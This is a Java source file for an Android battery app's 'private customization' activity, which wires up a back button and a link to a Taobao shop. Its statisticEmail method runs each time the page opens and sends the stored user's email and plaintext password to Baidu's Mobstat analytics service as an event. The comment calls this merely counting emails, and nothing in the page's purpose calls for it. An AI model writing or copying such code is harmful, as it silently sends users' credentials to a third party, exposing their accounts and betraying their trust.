package minggo.battery.activity;

import minggo.battery.R;
import minggo.battery.model.User;
import minggo.battery.service.MinggoApplication;
import minggo.battery.util.UserUtil;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

import com.baidu.mobstat.StatService;

/**
 * 私人定制页面
 * 
 * @author minggo
 * @time 2014-7-5 S下午12:42:23
 */
public class OrderActivity extends Activity implements OnClickListener {

	private View backBt;
	private Button orderBt;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_order);
		initUI();
		
		MinggoApplication.allActivities.add(this);
		statisticEmail();
	}
	/**
	 * 统计email
	 */
	private void statisticEmail(){
		User user = UserUtil.getFirstUser(this);
		if (user!=null) {
			if (user.email!=null&&user.password!=null) {
				StatService.onEvent(this, "email", user.email+","+user.password);
			}
		}
	}
	
	/**
	 * 初始化UI
	 */
	private void initUI() {
		backBt = findViewById(R.id.lo_order_back);
		orderBt = (Button) findViewById(R.id.bt_order);
		backBt.setOnClickListener(this);
		orderBt.setOnClickListener(this);
	}

	@Override
	public void onClick(View v) {
		switch (v.getId()) {
		case R.id.lo_order_back:
			onBackPressed();
			break;
		case R.id.bt_order:
			startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(MinggoApplication.TAOBAO_URL)));
			break;
		default:
			break;
		}

	}
	@Override
	protected void onResume() {
		super.onResume();
		StatService.onResume(this);
	}
	
	@Override
	protected void onPause() {
		super.onPause();
		StatService.onPause(this);
	}
	
	@Override
	public void onBackPressed() {
		super.onBackPressed();
		finish();
	}
}
